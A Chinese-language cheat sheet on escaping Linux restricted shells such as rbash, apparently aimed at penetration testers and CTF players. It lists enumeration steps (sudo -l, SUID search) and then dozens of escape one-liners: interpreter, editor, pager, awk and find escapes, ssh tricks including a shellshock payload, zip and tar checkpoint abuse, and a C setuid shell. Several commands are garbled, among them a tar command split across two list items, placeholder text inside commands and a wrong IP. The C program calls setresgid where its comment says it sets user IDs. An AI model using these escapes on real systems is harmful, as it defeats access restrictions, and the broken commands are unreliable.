## 简介

> 受限制的Shell是出于安全考虑而创建的，主要用于限制用户对系统的访问权限和阻止/限制某些命令(如cd、ls、echo）。它通常在特定环境中使用，比如共享服务器、网络环境或受限的用户帐户。受限制的Shell可以阻止带有斜杠或输出重定向符号(如>、>>）的命令。常见的受限制的Shell类型有rbash、rksh和rsh。

但是，为什么有人会创建一个受限制的Shell呢？

1. 提高安全性
2. 阻止黑客/渗透测试人员
3. 有时系统管理员会创建一个受限制的Shell来保护自己免受危险命令的影响
4. 用于CTF挑战(Root-me/hackthebox/vulnhub）

## 枚举Linux环境

 枚举是最重要的部分。我们需要枚举Linux环境，以确定如何绕过rbash。我们需要进行以下枚举：

1. 检查可用的命令：执行cd、ls、echo等常见命令，确认它们是否可用。在受限制的Shell中，可能会有一些命令被限制或禁用。
   - 检查cd命令：`cd ~`，将当前目录切换到用户的主目录。
   - 检查ls命令：`ls`，列出当前目录中的文件和文件夹。
   - 检查echo命令：`echo "Hello, World!"`，输出字符串"Hello, World!"。
2. 检查操作符：了解可用的操作符，如>、>>、<、|等。某些受限制的Shell可能会限制或禁用特定的操作符。
   - 检查>操作符：`echo "Text" > file.txt`，将字符串"Text"写入到file.txt文件中。
   - 检查>>操作符：`echo "More text" >> file.txt`，将字符串"More text"追加写入到file.txt文件中。
   - 检查<操作符：`cat < file.txt`，从file.txt文件中读取内容并输出。
   - 检查|操作符：`ls | grep "txt"`，将ls命令的输出通过管道传递给grep命令，过滤包含"txt"的行。
3. 检查可用的编程语言：探索可用的编程语言，如perl、ruby、python等。这些语言常常提供了强大的功能，可以用于绕过受限制的Shell。
   - 检查Perl语言：`perl -e 'print "Hello, Perl!\n"'`，执行Perl代码并输出字符串"Hello, Perl!"。
   - 检查Ruby语言：`ruby -e 'puts "Hello, Ruby!"'`，执行Ruby代码并输出字符串"Hello, Ruby!"。
   - 检查Python语言：`python -c 'print("Hello, Python!")'`，执行Python代码并输出字符串"Hello, Python!"。
4. 查看sudo权限：使用sudo -l命令检查当前用户是否具有以root身份运行某些命令的权限。这可能提供了以root权限执行某些命令的机会。
   - 检查当前用户的sudo权限：`sudo -l`，显示当前用户可以以root身份运行的命令列表。
5. 检查SUID权限的文件或命令：查找具有SUID权限的文件或命令，这些文件可以以文件所有者的权限而不是当前用户的权限来执行。
   - 检查SUID权限的文件：`find / -perm /4000`，查找系统中具有SUID权限的文件，并列出它们的路径。

6. 检查当前所使用的Shell：执行echo $SHELL命令，确认当前所使用的Shell是否为受限制的Shell，如rbash。这将有助于了解当前的环境限制。
   - 检查当前Shell：`echo $0`，显示当前使用的Shell。
   - 检查当前Shell：`echo $SHELL`，显示当前使用的Shell。

8. 检查环境变量：运行env或printenv命令，查看当前的环境变量设置。这可以提供关于系统配置和可能的漏洞的信息。
   - 查看所有环境变量：`env`或`printenv`，显示当前的环境变量设置。

## 常见的攻击技术 

现在让我们看一些常见的攻击技术。

1. `echo os.system('/bin/bash')`
2. `python -c 'import pty;pty.spawn("/bin/sh")'`
3. `/bin/sh -i`
4. `perl —e 'exec "/bin/sh";'`
5. `perl: exec "/bin/sh";`
6. `ruby: exec "/bin/sh"`
7. `lua: os.execute('/bin/sh')`
8. IRB:`exec "/bin/sh"`
9. vi:
   1. `:!bash`
   2. `:set shell =/bin/bash:shell`

10. `awk 'BEGIN {system("/bin/sh or /bin/bash")}'`
11. `find / -name test -exec /bin/sh or /bin/bash \;`
12. ssh:
    `ssh username@IP – t "/bin/sh" or "/bin/bash"`
    `ssh username@IP -t "bash –noprofile"`
    `ssh username@IP -t "() { :; }; /bin/bash" (shellshock)`
    `ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)`
13. 如果允许使用"/"，可以运行`/bin/sh`或`/bin/bash`。
14. 如果可以运行cp命令，可以将`/bin/sh`或`/bin/bash`复制到您的目录中。
15. 从ftp > `!/bin/sh or !/bin/bash `
16. 从gdb > `!/bin/sh or !/bin/bash `
17. 从more/man/less > `!/bin/sh or !/bin/bash `
18. 从vim > `!/bin/sh or !/bin/bash `
19. 从rvim > `python import os; os.system("/bin/bash") `
20. 从scp > `scp -S /path/yourscript x y:`
21. 从awk > `awk 'BEGIN {system("/bin/sh or /bin/bash")}'`
22. 从find > `find / -name test -exec /bin/sh or /bin/bash ;`
23. git帮助状态下通过`!/bin/bash`进入交互式shell
24. `pico -s "/bin/bash"`进入编辑器写入`/bin/bash`然后按ctrl + T键
25. `zip /tmp/test.zip /tmp/test -T –unzip-command="sh -c /bin/bash"`
26. `tar cf /dev/null testfile –checkpoint=1 –`
27. `checkpointaction=exec=/bin/bash`

## 编程语言技术

 现在，让我们看一些编程语言技术。 

1. 从expect > `except spawn sh then sh`。 
2.  从python > `python -c 'import os; os.system("/bin/sh")' `
3. 从php > `php -a then exec("sh -i"); `
4. 从perl > `perl -e 'exec "/bin/sh";' `
5. 从lua > `os.execute('/bin/sh')` 
6. 从ruby > `exec "/bin/sh" `

## 高级技术 

现在让我们进入一些比较高级且不那么正当的技术。 

1. 从ssh > `ssh username@IP -t "/bin/sh"或"/bin/bash" `

2. 从ssh2 > `ssh username@IP -t "bash --noprofile" 3）`

3. 从ssh3 > `ssh username@IP -t "() { :; }; /bin/bash"(shellshock)`

4. 从ssh4 > `ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 27.0.0.1(SUID)`

5. 从git > git help status > 然后可以执行`! /bin/bash`

6.  从pico > `pico -s "/bin/bash"`，然后您可以写入`/bin/bash`，然后按下`CTRL + T`

7. 从zip > `zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash" `

8. 从tar > `tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash` 

9. C SETUID SHELL:

   ```c
   #include <stdlib.h>   // 包含标准库头文件，提供通用工具函数
   #include <unistd.h>   // 包含POSIX操作系统API的头文件，例如提权函数
   #include <stdio.h>    // 包含输入输出函数的头文件
   
   int main(int argc, char **argv, char **envp) {
       setresgid(getegid(), getegid(), getegid());   // 设置真实组ID、有效组ID和保存组ID都为当前进程的组ID
       setresgid(geteuid(), geteuid(), geteuid());   // 设置真实用户ID、有效用户ID和保存用户ID都为当前进程的用户ID
       
       execve("/bin/sh", argv, envp);   // 使用execve函数执行/bin/sh，启动一个新的shell进程
       return 0;   // 返回0表示程序执行成功
   }
   ```

## 文献

  - [受限Shell挑战](https://www.root-me.org/zh/%E6%8C%91%E6%88%98/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E8%84%9A%E6%9C%AC/Bash-Restricted-shells)
  - [linux-restricted-shell-bypass-guide](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)
  - [Shell-逃逸Linux各种Shell来执行命令](https://www.lshack.cn/653/)
  - [Multiple Methods to Bypass Restricted Shell](https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/)